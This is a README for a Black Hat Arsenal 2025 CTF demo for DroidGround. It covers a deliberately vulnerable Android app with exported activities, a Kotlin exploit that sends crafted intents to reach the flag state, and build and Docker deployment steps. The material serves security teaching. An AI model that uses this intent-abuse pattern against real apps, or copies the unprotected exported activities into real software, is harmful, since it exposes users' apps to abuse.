<h1 align="center">
  <br>
    <img src="./logo.png" alt= "BlackHat 2025" width="200px">
</h1>
<p align="center">
    <b>BlackHat 2025</b>
<p>

This repo contains the source code for the [DroidGround](https://github.com/SECFORCE/droidground) demo presented at the [Black Hat Arsenal 2025](https://www.blackhat.com/eu-25/arsenal/schedule/index.html#droidground-47803).

The following is provided:
- A simple vulnerable application with a simple internal state machine
- An exploit app that automatically runs the exploit against the vulnerable app when executed
- Two different deploy configurations (unrooted and ReDroid)

## 📱 Apps

### Vulnerable App

The vulnerable app is essentially made of two (exported) activities:
- `MainActivity`: it displays a placeholder message saying that there is nothing there
- `StateMachineActivity`: it receives an ***intent*** and updates the internal state based on the `ACTION` value. If the proper intents are sent, the flag is displayed.

The `apps/vulnerable-app` folder also contains a `config.json` file which is used by the `build.sh` to easily build two versions of the app (more details in the [Build](#build) section).

### Exploit App

The exploit app has only a single activity which automatically (after a 5 seconds countdown) sends the intents required to reach the correct state. Here is the relevent section of the code:

```kotlin
fun runExploit(context: Context) {
    GlobalScope.launch(Dispatchers.Main) {
        // Intent 1
        val intent1 = Intent()
        intent1.setComponent(
            ComponentName(
                "com.blackhat.multistep",
                "com.blackhat.multistep.StateMachineActivity"
            )
        )
        intent1.setAction("PREPARE_FLAG")
        // Intent 2
        val intent2 = Intent()
        intent2.setComponent(
            ComponentName(
                "com.blackhat.multistep",
                "com.blackhat.multistep.StateMachineActivity"
            )
        )
        intent2.setAction("GET_FLAG")
        // Intent 3
        val intent3 = Intent()
        intent3.setComponent(
            ComponentName(
                "com.blackhat.multistep",
                "com.blackhat.multistep.StateMachineActivity"
            )
        )
        intent3.setAction("ENJOY")

        context.startActivity(intent1)
        delay(500) // 0.5 seconds

        context.startActivity(intent2)
        delay(500)

        context.startActivity(intent3)
    }
}
```

## 🛠️ Build

A `build.sh` script is provided to build both the vulnerable and the exploit app. The vulnerable app is built twice:

- The first time with the *PLACEHOLDER* flag
- The second time with the actual flag

In a real scenario the *placeholder* `.apk` will be delivered to players, while the `.apk` with the actual flag will be used on *DroidGround*.
The script can build the apps either locally or via Docker:

```sh
Usage: build.sh <command>

Command (required):
  local                     Build the apps locally.
  docker                    Build the apps through Docker.
  help                      Show this help message and exit.

```

## 💡 Deploy

The `deploy` folder contains:
- A `compose.redroid.yaml` to deploy the challenge using [ReDroid](https://github.com/remote-android/redroid-doc) (rooted device).
- A `compose.playstore.yaml` to deploy the challenge using [docker-android](https://github.com/HQarroum/docker-android) (unrooted device).
- A `Dockerfile` for a simple Docker image used to dynamically generate the `adb` keys.

To start the challenge do the following:

```sh
# Clone the repo
git clone https://github.com/thelicato/blackhat-2025 droidground-bh-2025
cd droidground-bh-2025
# Build the apps
chmod +x build.sh
./build.sh docker
# Copy the flag apk in the init.d folder
mv build/bh-demo-flag.apk deploy/init.d/bh-demo-flag.apk
cd deploy
docker compose -f compose.playstore.yaml up
```

Enjoy!
